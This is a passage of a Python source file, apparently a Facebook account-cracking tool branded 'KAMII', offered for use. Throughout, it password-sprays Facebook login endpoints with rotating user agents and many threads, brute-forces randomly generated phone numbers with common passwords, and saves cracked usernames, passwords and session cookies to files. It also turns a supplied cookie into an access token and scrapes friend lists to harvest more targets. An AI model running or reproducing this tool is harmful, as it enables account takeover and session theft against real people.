                                        'sec-ch-ua': '"(Not(A:Brand";v="99"',
                                        'sec-ch-ua-mobile': '?0',
                                        'sec-ch-ua-platform': 'Unknown',
                                        'sec-ch-prefers-color-scheme': 'light',
                                        'dnt': '1',
                                        'upgrade-insecure-requests': '1',
                                        'user-agent': sua,
                                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                        'sec-fetch-site': 'same-origin',
                                        'sec-fetch-mode': 'navigate',
                                        'sec-fetch-user': '?1',
                                        'sec-fetch-dest': 'document',
                                        'accept-encoding': 'gzip, deflate, br',
                                        'accept-language': 'en-US,en;q=0.9'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                dc=dict(session.cookies)
                coki=";".join([k+"="+v for k,v in dc.items()])
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [KAMII-OK] {user} | {pw}")
                    wrt=f"{user}|{pw}|{coki}\n"
                    ok.append(wrt)
                    open('/sdcard/KAMII/OK.txt' , "a").write(user+'|'+pw+'\n')
                    open('/sdcard/KAMII/OK-WITH-COOKIE.txt' , "a").write(wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                        print('\r%s\33[1;31m [KAMII-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        ok.append(wrt)
                        open('/sdcard/KAMII/CP.txt' , 'a').write('%s\n' % wrt)
                        break
                else:
                    continue
            
            loop+=1
        except requests.exceptions.ConnectionError:
                self.methodD(user, pw, cebok)

            #method 2
    def __method2__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[KAMII-M2] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                session=requests.Session()
                ua=random.choice(ugen)
                header = {}
                r = session.get(f"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {'Host': 'mbasic.facebook.com',
                           'method':'GET',
                           'viewport-width': '980',
                           'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                           'sec-ch-ua-mobile': '?0',
                           'sec-ch-ua-platform': '"Windows"',
                           'sec-ch-prefers-color-scheme': 'light',
                           'dnt': '1',
                           'upgrade-insecure-requests': '1',
                           'user-agent':ua,
                           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                           'sec-fetch-site': 'same-origin',
                           'sec-fetch-mode': 'navigate',
                           'sec-fetch-user': '?1', 
                           'sec-fetch-dest': 'document', 
                           'accept-encoding': 'gzip, deflate, br',
                           'accept-language': 'en-US,en;q=0.9'}
                po = session.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                dc=dict(session.cookies)
                coki=";".join([k+"="+v for k,v in dc.items()])
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [KAMII-OK] {user} | {pw}")
                    wrt=f"{user}|{pw}|{coki}\n"
                    ok.append(wrt)
                    open('/sdcard/KAMII/OK.txt' , "a").write(user+'|'+pw+'\n')
                    open('/sdcard/KAMII/OK-WITH-COOKIE.txt' , "a").write(wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                        print('\r%s\33[1;31m [KAMII-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/KAMII/CP.txt' , 'a').write('%s\n' % wrt)
                else:
                    continue
            loop+=1
        except:
            self.__method2__(user, pw, cebok)

                     #method 3
    def __method3__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[KAMII-M3] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                session=requests.Session()
                ua=random.choice(ruz)
                header = {}
                r = session.get(f"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers={})
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                header1 = {'Host': 'p.facebook.com',
                           'path': '/',
                           'scheme': 'https',
                           'method':'GET',
                           'viewport-width': '980',
                           'referer': 'https://p.facebook.com/',
                           'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                           'sec-ch-ua-mobile': '?0',
                           'sec-ch-ua-platform': '"Windows"',
                           'sec-ch-prefers-color-scheme': 'light',
                           'dnt': '1',
                           'upgrade-insecure-requests': '1',
                           'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
                           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                           'sec-fetch-site': 'same-origin',
                           'sec-fetch-mode': 'navigate',
                           'sec-fetch-user': '?1', 
                           'sec-fetch-dest': 'document', 
                           'accept-encoding': 'gzip, deflate, br',
                           'accept-language': 'en-US,en;q=0.9'}
                po = session.post(f"https://p.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                dc=dict(session.cookies)
                coki=";".join([k+"="+v for k,v in dc.items()])
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [KAMII-OK] {user} | {pw}")
                    wrt=f"{user}|{pw}|{coki}\n"
                    ok.append(wrt)
                    open('/sdcard/KAMII/OK.txt' , "a").write(user+'|'+pw+'\n')
                    open('/sdcard/KAMII/OK-WITH-COOKIE.txt' , "a").write(wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                        print('\r%s\33[1;31m [KAMII-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/KAMII/CP.txt' , 'a').write('%s\n' % wrt)
                        break
                else:
                    continue
            loop+=1
        except:
            self.__method3__(user, pw, cebok)

    def __pler__(self):
            os.system('clear')
            print(logo)
            try:
                npwds=int(input("\033[1;32m[*]How many passwords you want to add :\033[1;37m "))
                line()
            except:
                npwds=1
            pwdl=[]
            n=0
            for i in range(npwds):
                n=n+1
                a=input(f"\033[1;32m Enter Password {n} :\033[1;37m ")
                pwdl.append(a)
            os.system('clear')
            print(logo)
            print("\033[1;33m\r Use Jahaz For OK IDS\033[1;37m")
            line()
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Sabar Rakho BS..')
            line()
            with kaam(max_workers=30) as kamran:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    #try:
                        npwds=[]
                        user,name=zsb.split("|")
                        user=user.strip()
                        name=name.strip()
                        spn=name.split(" ")
                        First,Last=spn[0],spn[-1]
                        FIRST,LAST=First.upper(),Last.upper()
                        first,last=First.lower(),Last.lower()
                        for i in pwdl:
                            npwds.append(i.replace("first",first).replace("last",last).replace("First",First).replace("Last",Last).replace("FIRST",FIRST).replace("LAST",LAST))
                        npwds.append(name) if len(spn)>2 else 0
                        if 'm1' in method:
                            kamran.submit(self.methodD, user, npwds, "mbasic.facebook.com")
                        elif 'm2' in method:
                            kamran.submit(self.__method2__, user, npwds, "mbasic.facebook.com")
                        elif 'm3' in method:
                            kamran.submit(self.__method3__, user, npwds, "mbasic.facebook.com")
                        else:exit
            print('\033[1;37m')
            line()
            print(' The process has completed')
            print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
            line()
            input(' Press enter to back ')
            menu()

class crack_main():
    def __init__(self):
        self.id=[]
    def crack(self):
        global method
        os.system('clear')
        print(logo)
        print('\033[1;31mEnter File Name For Example')
        line()
        print('\033[1;36m/sdcard/filename.txt')
        line()
        self.file = input('\033[1;36mEnter File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(' No file found ....')
            exit()
    def m1(self,iid,name,passlist):
        try:
            global ok,loop,android_models
            sys.stdout.write(f"\r \x1b[1;97m[KAMII-M4] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}");sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                client_id = '586963836795390'
                client_secrets = '04dfd5af1f19537739b0fdf871849587'
                version = str(random.randrange(8,15))
                osv = str(random.randrange(1,9))
                abv = ['A','B','C']
                
                if '8' in version:
                    ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
                elif '9' in version:
                    ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
                elif '10' in version:
                    ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
                elif '11' in version:
                    ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
                elif '12' in version:
                    ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
                elif '13' in version:
                    ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
                elif '14' in version:
                    ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
                elif '15' in version:
                    ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                ua_oso = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR/Reliance JIO;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]'
                uaft = random.choice(hh)
                ua = random.choices(ugen)
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1
                data = {
                    'adid':adid,
                    'format':'json',
                    'api_key':'bd9778e5b03b4aec36f20f1859787f1c',
                    'device_id':device_id,
                    'family_device_id':device_id,
                    'currently_logged_in_userid':'0',
                    'try_num':'1',
                    'email':iid,
                    'password':pas,
                    'jazoest':j2,
                    'generate_analytics_claim':'1',
                    'cpl':'true',
                    'generate_session_cookies':'1',
                #    'sim_serials':'%5B%2289014103211118510720%22%5D',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'auth.login',
                    'locale':'en_US',
                    'client_country_code':'US',
                    'advertising_id':adid,
                    'meta_inf_fbmeta':'NO_FILE',
                    'access_token':f'{client_id}|{client_secrets}'
                }
                head = {
                    'Authorization':f'OAuth {client_id}|{client_secrets}',
                    'X-FB-Connection-Quality':'EXCELLENT',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                    'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                    'x-fb-friendly_name':'authenticate',
                    'content-encoding':'application/x-www-form-urlencoded',
                    'x-tigon-is_retry':'true',
                    'x-fb-http-engine':'Liger',
                    'x-requested-with':'com.facebook.katana',
                    'connection':'close',
                    'user-agent':ua,}
                url = 'https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true)'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'access_token' in q:
                    print(' \033[1;32m [OK] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/KAMII/OK.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'two_factor' in q:
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(' \033[1;31m [CP] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/KAMII/CP.txt','a').write(iid+'|'+pas+'\n')
                else:
                    continue
            loop+=1
        except:
            (self.m1,iid,name,passlist)

    def pasw(self):
        os.system('clear')
        print(logo)
        passlist = []
        pl = int(input('\033[1;32m[*]How many passwords you want to add :\033[1;37m '))
        line()
        for cd in range(pl):
                passlist.append(input(f'\033[1;32m Enter Password {cd+1}:\033[1;37m '))
        os.system('clear')
        print(logo)
        print("\033[1;33m\r Use Jahaz For OK IDS\033[1;37m")
        line()
        print('\033[1;37m Total IDs : %s ' % len(self.id))
        print('\033[1;37m Sabar Rakho BS..')
        line()
        with ThreadPool(max_workers=30) as formSubmit:
            for user in self.id:
                iid,name = user.split('|')
                if 'm4' in method:
                    formSubmit.submit(self.m1,iid,name,passlist)
                else:exit()
        print('\033[1;37m')
        line()
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        line()
        input(' Press enter to back ')
        menu()


def rndom():
    uid=[]
    os.system('clear')
    print(logo)
    print('\033[1;31m[*] EXAMPLE :92318,92345,92323,92306.ETC')
    line()
    kode = input('[+]\033[1;36m PUT YOUR SIM CODE : ')
    line()
    limit = int(input('\033[1;36m[+]How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with kaam(max_workers=35) as kamran:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('\033[1;37m[*] Total Acounts : '+tl)
        print('\033[1;32m[+] Your Select Code : '+kode)
        print('\033[1;36m[*] If You No Result Use Flight Mode ')
        line()
        for guru in uid:
            uid = kode+guru
            pwx = [kode,kode+guru,'khankhan','khan1122']
            kamran.submit(rcrack1,uid,pwx,tl)
    line() 
    print('[✓] Crack process has been completed')
    print('[?] Idz saved in [KAMII-OK.txt,KAMII-CP.txt]')
    line()
    input('Press Enter To Go Back To Menu')
    menu()

def rcrack1(uid,pwx,tl):
    global loop
    global cp
    global ok
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r[\033[1;97mKAMII\033[1;97m] %s|OK:-%s \r'%(loop,len(ok))),
            sys.stdout.flush()
            ua = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {'authority':'t.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
            'referer': 'https://t.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent':ua,}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[OK] '+cid+' | '+ps+'\033[1;32m')
                open('/sdcard/KAMII/RNDM-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ok.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[CP] '+uid+' | '+ps+'\33[0;97m')
                open('/sdcard/KAMII/RNDM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cp.append(cid)
                break
            else:
                continue
        loop+=1
    except Exception as e:
        pass


def login():
    os.system('clear')
    print (logo)
    try:
        cokies = str(input('\033[0;97mCookie: '))
        if len(cokies)<10:
            print ('\033[0;97minvalid Cookie')
            time.sleep(1)
            clear()
            menu()
        cookie = {'cookie':cokies}
        ses = requests.Session()
        data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
        req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
        cd   = req['code']
        ucd  = req['user_code']
        url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)
        req  = BeautifulSoup(ses.get('https://mbasic.facebook.com/device',cookies=cookie).content,'html.parser')
        raq  = req.find('form',{'method':'post'})
        dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
        rel  = 'https://mbasic.facebook.com' + raq['action']
        pos  = BeautifulSoup(ses.post(rel,data=dat,cookies=cookie).content,'html.parser')
        dat  = {}
        raq  = pos.find('form',{'method':'post'})
        for x in raq('input',{'value':True}):
            try:
                if x['name'] == '__CANCEL__' : pass
                else: dat.update({x['name']:x['value']})
            except Exception as e: pass
        rel = 'https://mbasic.facebook.com' + raq['action']
        pos = BeautifulSoup(ses.post(rel,data=dat,cookies=cookie).content,'html.parser')
        req = ses.get(url,cookies=cookie).json()
        tok = req['access_token']
        open('.access_token.txt', 'w').write(tok)
        open('.cokie.txt', 'w').write(cokies)
        ext_menu()
    except Exception as e:
        print ('\033[0;97mCookie invalid')
        time.sleep(3)
        login()

def ext_menu():
    os.system('clear')
    try:
        token  = open('.access_token.txt','r').read().replace('\n', '')
        cookie = open('.cokie.txt','r').read().replace('\n', '')
    except:
        print('\n\033[0;97mCookies Invalid ')
        os.system('rm -rf .access_token.txt .cokie.txt')
        time.sleep(1)
        login()
    try:
        me = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies={'cookie':cookie}).json()
        name = me['name']
        iid = me['id']
    except KeyError:
        if 'Error loading application' in str(me):
            print ('\r\033[0;97mCookie Not Expired But Need Login Again')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        elif 'Please reduce the amount' in str(me):
            print ('\r\033[0;97minternet Error')
            time.sleep(1)
            ext_menu()
        else:
            print ('\033[0;97mCokie invalid')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
    os.system('clear')
    print (logo)
    print ('\033[1;32m[1]Extract ids Choice Link (\033[1;37m10009,10008)')
    print ('\033[1;32m[2]Extract All Old Mix ids')
    print ('\033[1;32m[3]Extract All ids Auto')
    print ('\033[1;32m[4]Remove Double Links From File\033[0;97m')
    print ('\033[1;32m[5]Separate Links From File')
    print ('\033[1;32m[6]Cut Links From Used File')
    print ('\033[1;32m[7]Login New Cookies')
    print ('\033[1;32m[0]Back\033[0;97m')
    print (47*'-')
    ext_menu_sel()

def ext_menu_sel():
    hh = input('\033[1;36mSelect Option: \033[0;97m')
    if hh == "1" or hh == "01":
        lolex()
    elif hh == "2" or hh == "02":
        oldex()
    elif hh == "3" or hh == "03":
        autofile()
    elif hh == "4" or hh == "04":
        double()
    elif hh == "5" or hh == "05":
        separate()
    elif hh == "6" or hh == "06":
        cutrs()
    elif hh == "7" or hh == "07":
        os.system('rm -rf .access_token.txt')
        os.system('rm -rf .cokie.txt')
        login()
    elif hh == "0":
        menu()
    elif hh == "":
        print ('Select Valid Option')
        ext_menu_sel()
    else:
        print ('Select Valid Option')
        ext_menu_sel()

def lolex():
    os.system("clear")
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies Invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()

    os.system('clear')
    print (logo)
    print ('\033[1;33mFor Example /sdcard/filename.txt etc...\033[0;97m')
    print (47*'-')
    fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
    if '/sdcard/' not in fp:
        print ('\033[1;33mGive Correct Directory /sdcard/filename.txt\033[0;97m')
        time.sleep(2)
        lolex()
    print ('\033[1;33mExample 1, 2, 3, 4, 5, 6, 7 etc...\033[0;97m')
    zo = int(input('\033[1;32mHow Many Choice Links You Want To Select?: \033[0;97m'))
    print ('\033[1;33mSelect Link For Example 100089 100090')
    gh = []
    t = 0
    for t in range(zo):
        t+=1
        fb = input('\033[1;32m[%s]choose id link: \033[0;97m'%(t))
        gh.append(fb)
    print ('')
    newex(gh,fp,__cookie__,cookie)

def newex(gh,fp,__cookie__,cookie):
    csy = input('\033[1;32mids: \033[0;97m')
    bcd = csy.rsplit('|')[0]
    if csy == ' ' or csy == '':
        ext_menu()
    try:
        os.system('rm -rf .out*')
        ihh = '5000'
        knt = ('.out.txt')
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            name = ids['name']
            open(knt,'a').write(uid+'|'+name+'\n')

        print ('\r\033[1;32mAccount Extracted '+bcd)
        for zh in gh:
            os.system('cat .out.txt | grep '+zh+' >> .out1.txt')
            os.system('sort -r .out1.txt | uniq >> '+fp)
        newex(gh,fp,__cookie__,cookie)
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCookie not expired but need login again')
            newex(gh,fp,__cookie__,cookie)
        elif 'Please reduce the amount' in str(list_one):
            print ('\r\033[0;97minternet error missing extract link')
            newex(gh,fp,__cookie__,cookie)
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock')
            newex(gh,fp,__cookie__,cookie)
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie expired')
            newex(gh,fp,__cookie__,cookie)
        else:
            print('\r\033[0;97mAccount Private')
            newex(gh,fp,__cookie__,cookie)

def oldex():
    os.system("clear")
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()

    os.system('clear')
    print (logo)
    print ('')
    print ('\033[1;33mFor Example /sdcard/filename.txt\033[0;97m')
    print ('')
    fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
    if '/sdcard/' in fp:
        allex(fp,__cookie__,cookie)
    else:
        print ('\033[1;31mWrong input Directory')
        print ('\033[1;37mPut /sdcard/filename.txt')
        time.sleep(3)
        oldex()

def allex(fp,__cookie__,cookie):
    csy = input('id: ')
    bcd = csy.rsplit('|')[0]
    ihh = '5000'
    knt = ('.out.txt')
    ys  = open(knt, 'w')
    if csy == ' ' or csy == '':
        ext_menu()
    try:
        os.system('rm -rf .out*')
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            name = ids['name']
            open(knt,'a').write(uid+'|'+name+'\n')

        print ('\r\033[1;32mAccount Extracted '+bcd)
        vo = "10"
        os.system('cat .out.txt | grep '+ vo +' >> .out1.txt')
        os.system('sort -r .out1.txt | uniq >> '+fp)
        allex(fp,__cookie__,cookie)
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCookie not expired but need login again')
            allex(fp,__cookie__,cookie)
        elif 'Please reduce the amount' in str(list_one):
            print ('\r\033[0;97minternet error missing extract link')
            allex(fp,__cookie__,cookie)
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock')
            allex(fp,__cookie__,cookie)
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie Expired')
            allex(fp,__cookie__,cookie)
        else:
            print('\r\033[0;97mAccount private')
            allex(fp,__cookie__,cookie)

def autofile():
    os.system('clear')
    print (logo)
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()
    os.system('rm -rf .out*')
    try:
        rgb = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/ids.txt').text
        open('.ids.txt', 'w').write(rgb)
    except requests.exceptions.ConnectionError:
        print ('\033[0;97mNo internet Connection')
        sys.exit()
    ebd = open('.ids.txt', 'r').read().splitlines()[:2]
    fgf = open('.ids.txt', 'r').read().splitlines()[2:4]
    os.system('rm -rf .ids.txt')
    print ('\033[1;33mEnter Only 1 ID\033[0;97m')
    print (47*'-')
    bcd = input('\033[1;36mPut id: \033[0;97m')
    if bcd == '':
        ext_menu()
    ihh = '5000'
    knt = '.out.txt'
    try:
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            open(knt,'a').write(uid+'\n')

        print ('\r\033[1;32mAccount Extracted '+bcd)
        for vo in ebd:
            os.system('cat .out.txt | grep '+ vo +' >> .out1.txt')
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCokie not expired but need login again')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        elif 'Please reduce the amount' in str(list_one):
            print ('\033[0;97minternet error missing extract link')
            time.sleep(1)
            autofile()
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock')
            time.sleep(1)
            autofile()
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie Expired')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        else:
            print('\r\033[0;97mAccount Private')
            time.sleep(1)
            autofile()
    frf = [50, 55, 40, 60, 64, 69, 67, 71, 46, 58, 74]
    dtz = random.choice(frf)
    os.system('sort -r .out1.txt | uniq >> .out2.txt')
    bcf = open('.out2.txt', 'r').read().splitlines()[:dtz]
    if len(bcf)<2:
        print ('\n\033[1;33mNew ids not found in this link try another One\033[0;97m')
        input('Press enter to back')
        os.system('rm -rf .out*')
        ext_menu()
    os.system('rm -rf .out*')
    os.system('clear')
    print (logo)
    print ('\033[1;33mExample /sdcard/filename.txt\033[0;97m')
    print (47*'-')
    save_ = input('\033[1;33mOutput Save File Name: \033[0;97m')
    ihb = '5000'
    idx = []
    for uids in bcf:
        try:
            idd = []
            _cookie_ = open('.access_token.txt', 'r').read().replace('\n', '')
            cookie = open('.cokie.txt', 'r').read().replace('\n', '')
            list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(uids,_cookie_), cookies={'cookie':cookie}).json()
            for ids in list_one['friends']['data']:
                uid = ids['id']
                name = ids['name']
                idd.append(uid+'|'+name+'\n')
                open('.out.txt','a').write(uid+'|'+name+'\n')

            print ('\r\033[1;32mAccount Extracted '+uids+'\033[0;97m')
            for xo in fgf:
                os.system('cat .out.txt | grep '+ xo +' >> .out1.txt')
                os.system('sort -r .out1.txt | uniq >> '+save_)
            os.system('rm -rf .out*')
        except KeyError:
            if 'Error loading application' in str(list_one):
                print ('\r\033[0;97mCookie not expired but need login again')
                pass
            elif 'Please reduce the amount' in str(list_one):
                print ('\r\033[0;97minternet error missing extract link')
                pass
            elif 'Unsupported get request' in str(list_one):
                print ('\r\033[0;97mAccount cp or lock')
                pass
            elif 'error' in str(list_one):
                print('\r\033[0;97mCookies Expired')
                pass
            else:
                print ('\r\033[0;97mAccount Private')
                pass
    os.system('sort -r '+save_+' | uniq >> .out.txt')
    os.system('cat .out.txt > '+save_)
    yuy = open(save_, 'r').read().splitlines()
    fuf = str(len(yuy))
    print (47*'-')
    print ('\033[1;33mSuccessfully Creat File\033[0;97m')
    print (47*'-'+'\n\033[1;32mTotal ids > '+fuf)
    print (47*'-'+'\n\033[1;36mYour File Save Path > '+save_)
    input('\033[1;32mPress Enter To Back\033[0;97m')
    ext_menu()

def double():
    os.system('clear')
    print (logo)
    sf = input("\033[1;32mInput doubling File :\033[0;97m")
    if sf == ' ' or sf == '':
        menu()
